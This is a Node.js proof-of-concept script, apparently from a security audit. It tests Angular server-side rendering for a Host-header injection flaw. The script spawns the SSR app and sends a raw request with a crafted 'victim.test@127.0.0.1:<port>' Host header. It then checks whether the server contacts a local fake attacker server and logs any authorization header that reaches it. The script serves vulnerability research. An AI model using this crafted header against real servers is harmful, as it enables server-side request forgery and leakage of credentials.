import http from 'node:http';
import net from 'node:net';
import {spawn} from 'node:child_process';
import {setTimeout as delay} from 'node:timers/promises';

const serverEntry =
  '/Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/targets/angular/integration/platform-server/dist/standalone/server/server.mjs';

function listen(server, host = '127.0.0.1', port = 0) {
  return new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(port, host, () => {
      server.off('error', reject);
      resolve(server.address());
    });
  });
}

function waitForOutput(proc, marker, timeoutMs = 8000) {
  return new Promise((resolve, reject) => {
    let stdout = '';
    let stderr = '';
    const timer = setTimeout(() => {
      reject(new Error(`Timed out waiting for ${marker}; stdout=${stdout}; stderr=${stderr}`));
    }, timeoutMs);

    proc.stdout.on('data', (chunk) => {
      stdout += chunk;
      if (stdout.includes(marker)) {
        clearTimeout(timer);
        resolve({stdout, stderr});
      }
    });
    proc.stderr.on('data', (chunk) => {
      stderr += chunk;
    });
    proc.once('exit', (code, signal) => {
      clearTimeout(timer);
      reject(new Error(`SSR server exited early code=${code} signal=${signal}; stdout=${stdout}; stderr=${stderr}`));
    });
  });
}

function rawHttpRequest(port, raw) {
  return new Promise((resolve, reject) => {
    let data = '';
    const socket = net.connect({host: '127.0.0.1', port}, () => socket.write(raw));
    socket.setEncoding('utf8');
    socket.on('data', (chunk) => {
      data += chunk;
    });
    socket.on('end', () => resolve(data));
    socket.on('error', reject);
    socket.setTimeout(10000, () => {
      socket.destroy(new Error('raw request timeout'));
    });
  });
}

const attackerHits = [];
const attacker = http.createServer((req, res) => {
  const chunks = [];
  req.on('data', (chunk) => chunks.push(chunk));
  req.on('end', () => {
    attackerHits.push({
      method: req.method,
      url: req.url,
      host: req.headers.host,
      authorization: req.headers.authorization ?? null,
      bodyLength: Buffer.concat(chunks).length,
    });
    res.writeHead(200, {'content-type': 'application/json'});
    res.end(JSON.stringify({data: 'ATTACKER_API_2'}));
  });
});

const attackerAddress = await listen(attacker);
const ssr = spawn(process.execPath, [serverEntry], {
  stdio: ['ignore', 'pipe', 'pipe'],
});

try {
  await waitForOutput(ssr, 'Server listening on port 4206!');
  await delay(250);

  const raw = [
    'GET /http-transferstate-lazy HTTP/1.1',
    `Host: victim.test@127.0.0.1:${attackerAddress.port}`,
    'Connection: close',
    '',
    '',
  ].join('\r\n');

  const response = await rawHttpRequest(4206, raw);
  await delay(500);

  const body = response.split('\r\n\r\n').slice(1).join('\r\n\r\n');
  const result = {
    scenario: 'compiled Angular integration standalone SSR app on macOS',
    serverEntry,
    craftedRequest: {
      requestTarget: '/http-transferstate-lazy',
      hostHeader: `victim.test@127.0.0.1:${attackerAddress.port}`,
    },
    responseHead: response.split('\r\n\r\n')[0],
    responseContainsAttackerData: body.includes('ATTACKER_API_2'),
    attackerHits,
  };
  console.log(JSON.stringify(result, null, 2));
} finally {
  ssr.kill('SIGTERM');
  attacker.close();
}
